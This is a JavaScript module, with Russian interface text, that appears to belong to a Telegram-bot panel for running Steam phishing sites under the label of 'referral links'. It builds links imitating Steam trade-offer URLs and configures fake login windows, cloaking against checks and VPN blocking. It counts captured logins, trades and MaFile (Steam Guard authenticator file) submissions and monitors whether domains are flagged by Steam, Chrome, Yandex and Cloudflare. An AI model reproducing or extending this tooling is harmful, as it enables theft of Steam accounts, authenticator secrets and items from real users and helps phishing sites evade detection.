const { pe } = require("./emoji");
const { env } = require("../config/env");

const REF_CHARS = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
const ALPHA_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

function escapeHtml(value) {
  return String(value ?? "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function randomFromCharset(charset, length) {
  let out = "";
  for (let i = 0; i < length; i += 1) out += charset[Math.floor(Math.random() * charset.length)];
  return out;
}

function generateReferralCode(length = 6) {
  return randomFromCharset(REF_CHARS, length);
}

function generateAlphaCode(length = 8) {
  return randomFromCharset(ALPHA_CHARS, length);
}

function normalizeDomainName(domainName) {
  return String(domainName || "")
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//i, "")
    .replace(/^www\./i, "")
    .replace(/\/+$/, "");
}

/** Path для реферальной ссылки: {customId}token=XXXXXXXX на спец. доменах. */
function generateReferralPathForDomain(domainName, customId = "") {
  const host = normalizeDomainName(domainName);
  if (env.referralIdvTokenDomains.has(host)) {
    const id = String(customId || "").trim();
    if (!id) throw new Error("Не задан кастомный ID пользователя.");
    const length = Math.max(4, Number(env.referralIdvTokenLength) || 8);
    return `tradeoffer/new/?partner=${id}&token=${generateAlphaCode(length)}`;
  }
  return generateReferralCode();
}

function windowTypeLabel(type) {
  return {
    FakeWindow: "Фейк-окно",
    CurrentWindow: "Текущее окно",
    NewWindow: "Новое окно",
    AboutBlank: "About:Blank",
  }[type] || type || "—";
}

function yesNo(value) {
  return value ? "вкл." : "выкл.";
}

function banLabel(value) {
  const map = {
    NotBanned: "чисто",
    Banned: "бан",
    NoInfo: "нет данных",
  };
  return map[value] || value || "—";
}

function mergeDeviceCounts(stats) {
  const out = {};
  for (const row of Array.isArray(stats) ? stats : []) {
    for (const [name, count] of Object.entries(row?.devices || {})) {
      out[name] = (out[name] || 0) + (Number(count) || 0);
    }
  }
  return out;
}

function sumStatCounts(stats = []) {
  const out = {};
  for (const row of Array.isArray(stats) ? stats : []) {
    const action = row?.action || "Unknown";
    out[action] = (out[action] || 0) + (Number(row?.count) || 0);
  }
  return out;
}

function formatStatAction(action) {
  return {
    PageVisit: "Визиты",
    AuthVisit: "Авторизации",
    Log: "Логи",
    MaFile: "MaFile",
    Trade: "Трейды",
  }[action] || action;
}

function formatDate(value) {
  if (!value) return "—";
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) return "—";
  return date.toLocaleString("ru-RU", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });
}

function buildUrl(domainName, path) {
  const host = String(domainName || "").replace(/^https?:\/\//i, "").replace(/\/+$/, "");
  const slug = String(path || "").replace(/^\/+/, "");
  return slug ? `${host}/${slug}` : host;
}

function formatDevicesBlock(stats) {
  const devices = Object.entries(mergeDeviceCounts(stats)).sort((a, b) => b[1] - a[1]);
  if (!devices.length) return `${pe("info")} устройств пока нет`;
  return devices
    .slice(0, 8)
    .map(([name, count]) => `• ${escapeHtml(name)} — <b>${count}</b>`)
    .join("\n");
}

function formatActionsBlock(stats) {
  const actions = Object.entries(sumStatCounts(stats)).sort((a, b) => b[1] - a[1]);
  if (!actions.length) return `${pe("info")} событий пока нет`;
  return actions
    .map(([action, count]) => `• ${escapeHtml(formatStatAction(action))} — <b>${count}</b>`)
    .join("\n");
}

/** Человекочитаемые параметры ссылки */
function getLinkParamDefs(row = {}) {
  const steam = row?.steam || {};
  return [
    {
      key: "iframe",
      label: "Встроенный вход",
      hint: "Форма авторизации внутри страницы",
      value: Boolean(row.iframe),
      patch: (on) => ({ iframe: on }),
    },
    {
      key: "cloaking",
      label: "Маскировка",
      hint: "Скрывает содержимое от лишних проверок",
      value: Boolean(row.cloaking),
      patch: (on) => ({ cloaking: on }),
    },
    {
      key: "ban_vpn",
      label: "Блок VPN",
      hint: "Не пускать посетителей с VPN",
      value: Boolean(row.ban_vpn),
      patch: (on) => ({ ban_vpn: on }),
    },
    {
      key: "randPath",
      label: "Случайный адрес",
      hint: "Генерировать path автоматически",
      value: Boolean(row.randPath),
      patch: (on) => ({ randPath: on }),
    },
    {
      key: "logError",
      label: "Ошибка при логе",
      hint: "Показывать ошибку, если лог не прошёл",
      value: Boolean(steam.logError),
      patch: (on) => ({ logError: on }),
    },
    {
      key: "tradeError",
      label: "Ошибка при трейде",
      hint: "Показывать ошибку при проблеме с обменом",
      value: Boolean(steam.tradeError),
      patch: (on) => ({ tradeError: on }),
    },
    {
      key: "mafileError",
      label: "Ошибка MaFile",
      hint: "Показывать ошибку, если MaFile не принят",
      value: Boolean(steam.mafileError),
      patch: (on) => ({ mafileError: on }),
    },
    {
      key: "mafileSteamRedirect",
      label: "Редирект MaFile",
      hint: "После MaFile отправлять пользователя в Steam",
      value: Boolean(steam.mafileSteamRedirect),
      patch: (on) => ({ mafileSteamRedirect: on }),
    },
  ];
}

function formatLinkParamsHtml(row = {}) {
  const lines = [
    `${pe("settings")} <b>Параметры ссылки</b>`,
    "",
    ...getLinkParamDefs(row).flatMap((param) => [
      `• <b>${escapeHtml(param.label)}</b> — ${yesNo(param.value)}`,
      `  <i>${escapeHtml(param.hint)}</i>`,
    ]),
    "",
    `${pe("info")} Нажмите параметр ниже, чтобы включить или выключить.`,
  ];
  return lines.join("\n");
}

function formatSitesHubHtml(domains = [], ownerId) {
  const totalOnline = domains.reduce((sum, row) => sum + (Number(row.online) || 0), 0);
  const ownCount = domains.filter((row) => Number(row.owner) === Number(ownerId)).length;
  return [
    `${pe("link")} <b>Сайты</b>`,
    "",
    `${pe("statistics")} Доменов: <b>${domains.length}</b> · своих: <b>${ownCount}</b>`,
    `${pe("visible")} Онлайн сейчас: <b>${totalOnline}</b>`,
    "",
    domains.length
      ? `${pe("info")} Выберите домен или добавьте новый.`
      : `${pe("info")} Доменов пока нет — добавьте первый.`,
  ].join("\n");
}

function formatDomainCardHtml(domain, { own = false, linksCount = null } = {}) {
  const ban = domain?.banData || {};
  const count = linksCount != null ? linksCount : Number(domain?.linksCount || 0);
  const lines = [
    `${pe("link")} <b>Домен</b>`,
    `<code>${escapeHtml(domain?.domain || "—")}</code>`,
    "",
    `${pe("tag")} ID: <code>${domain?.id ?? "—"}</code>`,
    `${pe("success")} Статус: <b>${escapeHtml(domain?.status || "—")}</b>`,
    `${pe("visible")} Онлайн: <b>${Number(domain?.online || 0)}</b>`,
    `${pe("profile")} Тип: <b>${own ? "личный" : "командный"}</b>`,
    // Как в панели: свои ссылки и IP видны и на командном домене.
    `${pe("attachment")} Ваших ссылок: <b>${count}</b>`,
    domain?.ip ? `${pe("location")} IP: <code>${escapeHtml(domain.ip)}</code>` : null,
  ];

  if (domain?.createdAt) {
    lines.push(`${pe("calendar")} Создан: ${escapeHtml(formatDate(domain.createdAt))}`);
  }

  // Полная статистика домена — только у владельца; у командного в панели её нет.
  if (own) {
    lines.push("", `${pe("statistics")} <b>Статистика домена</b>`, formatActionsBlock(domain?.stats));
  }

  lines.push(
    "",
    `${pe("lock")} <b>Проверки</b>`,
    `• Steam — <b>${escapeHtml(banLabel(ban.bannedAtSteam))}</b>`,
    `• Whois — <b>${escapeHtml(banLabel(ban.bannedAtWhois))}</b>`,
    `• Chrome — <b>${escapeHtml(banLabel(ban.bannedAtChrome))}</b>`,
    `• Yandex — <b>${escapeHtml(banLabel(ban.bannedAtYandex))}</b>`,
    `• Cloudflare — <b>${escapeHtml(banLabel(ban.bannedAtCloudFlare))}</b>`
  );

  return lines.filter((line) => line != null).join("\n");
}

function formatReferralLinkHtml(domainName, path, row = {}, domain = null, { ownDomain = false } = {}) {
  const url = buildUrl(domainName, path);
  const template = row?.template || {};
  const lines = [
    `${pe("gift")} <b>Реферальная ссылка</b>`,
    "",
    `${pe("link")} <code>${escapeHtml(url)}</code>`,
    row?.id != null ? `${pe("tag")} ID ссылки: <code>${row.id}</code>` : null,
    "",
    `${pe("file")} Шаблон: <b>${escapeHtml(template.name || "не выбран")}</b>`,
    `${pe("visible")} Окно входа: <b>${escapeHtml(windowTypeLabel(row.windowType))}</b>`,
    "",
    `${pe("analytics")} <b>Сводка</b>`,
    `${pe("visible")} Онлайн по ссылке: <b>${Number(row.online || 0)}</b>`,
    formatActionsBlock(row.stats),
    "",
    `${pe("users")} <b>Устройства</b>`,
    formatDevicesBlock(row.stats),
  ];

  if (domain) {
    lines.push(
      "",
      `${pe("package")} <b>Домен</b>`,
      `${pe("success")} Статус: <b>${escapeHtml(domain.status || "—")}</b>`,
      `${pe("visible")} Онлайн домена: <b>${Number(domain.online || 0)}</b>`
    );
    if (ownDomain) {
      lines.push(
        `${pe("attachment")} Всего ссылок: <b>${Number(domain.linksCount || 0)}</b>`,
        domain.ip ? `${pe("location")} IP: <code>${escapeHtml(domain.ip)}</code>` : null,
        "",
        `${pe("statistics")} <b>Статистика домена</b>`,
        formatActionsBlock(domain.stats)
      );
    }
  }

  lines.push(
    "",
    `${pe("info")} Параметры ссылки — в кнопке «Параметры».`
  );

  return lines.filter((line) => line != null).join("\n");
}

module.exports = {
  generateReferralCode,
  generateReferralPathForDomain,
  generateAlphaCode,
  normalizeDomainName,
  mergeDeviceCounts,
  formatReferralLinkHtml,
  formatSitesHubHtml,
  formatDomainCardHtml,
  formatLinkParamsHtml,
  getLinkParamDefs,
  escapeHtml,
  windowTypeLabel,
  buildUrl,
};
